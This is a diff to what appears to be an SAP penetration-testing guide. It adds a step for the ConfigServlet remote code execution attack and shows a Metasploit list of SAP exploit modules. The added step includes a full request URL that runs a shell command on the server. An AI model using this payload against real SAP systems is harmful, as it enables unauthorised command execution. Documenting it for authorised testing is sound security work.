@@ -166,7 +166,10 @@ Matching Modules
    exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
    exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow                   
 ```
-- Try to use some known exploits or attacks like 
+- Try to use some known exploits or attacks like the old but goodie SAP ConfigServlet Remote Code Execution:
+```
+http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
+```
 
 ## References
 - [SAP Penetration Testing Using Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
